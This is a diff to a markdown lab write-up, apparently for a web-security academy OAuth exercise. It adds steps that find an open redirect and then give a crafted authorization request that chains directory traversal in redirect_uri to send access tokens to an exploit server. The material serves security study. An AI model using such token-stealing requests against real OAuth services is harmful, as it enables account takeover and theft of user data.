@@ -150,7 +150,12 @@ These will often return a JSOn configuration flie containing key information, su
 - Note that for the implicit grant type, stealing the access token doesn't just enable you to log in to the victim's account on the client application. As the entire implicit flow takes place via the browser, you can also use the token to make your own API calls to the OAuth service's resource server. This may enable you to fetch sensitive user data that you cannot normally access from the client application's web UI.
 
 #### Lab: Stealing OAuth Access Tokens via an Open Redirect
-- So we know there is an open redirect vulnerability somewhere ... let's take a look. When searching through the app, I noticed the ability to comment on a blog, but I did not find an open redirect vuln there. However, when selecting 'Next Post', I noticed the following parameter, `path` in the call: `GET /post/next?path=/post?postId=8`. I replaced the value with `https://google.com`, and I confirmed an open redirect vuln. 
-- 
+- So we know there is an open redirect vulnerability somewhere ... let's take a look. When searching through the app, I noticed the ability to comment on a blog, but I did not find an open redirect vuln there. However, when selecting 'Next Post', I noticed the following parameter, `path` in the call: `GET /post/next?path=/post?postId=8`. I replaced the value with `https://google.com`, and I confirmed an open redirect vuln.
+- Okay, we now need to examine the OAuth flow. We found that the `redirect_uri` was vulnerbale to the directory traversal trick we wrote about earlier. We found that the following led to a successful redirection to our exploit server:
+```
+GET /auth?client_id=wkif167dcko8iakmxn21i&redirect_uri=https://0af4009d0438773186de718100830085.web-security-academy.net/oauth-callback/../../post/next?path=https://exploit-0a1e0069049a775986497016018d00a6.exploit-server.net/exploit&response_type=token&nonce=-1325804996&scope=openid%20profile%20email
+```
+
+
 #### OpenID Connect
 - OpenID Connect extends the OAuth protocol to provide a dedicated identity and authentication layer that sits on top of the basic OAuth implementation. 
